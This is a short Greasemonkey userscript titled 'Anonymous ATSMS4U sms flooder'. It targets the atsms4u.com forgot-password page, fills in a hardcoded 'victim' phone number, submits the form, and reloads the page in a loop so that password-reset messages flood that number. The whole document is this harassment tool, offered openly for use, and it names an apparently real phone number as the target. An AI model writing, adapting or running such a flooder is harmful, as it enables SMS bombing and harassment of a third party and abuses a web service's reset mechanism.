// ==UserScript==
// @name                   Anonymous ATSMS4U sms flooder
// @namespace              SUNNY020
// @description            flooder sms
// @include                http://*atsms4u.com/*
// ==/UserScript==

var victim=8877161311 //Enter victims number here

if(document.location=="http://www.atsms4u.com/forgotpass.php"||document.location=="http://www.atsms4u.com/forgotpass.php")
{
document.getElementById('username').value=victim;
document.forms[0].submit();
}
if(document.location=="http://www.atsms4u.com/forgotpass.php"||document.location=="http://www.atsms4u.com/forgotpass.php")
document.location='http://www.atsms4u.com/forgotpass.php';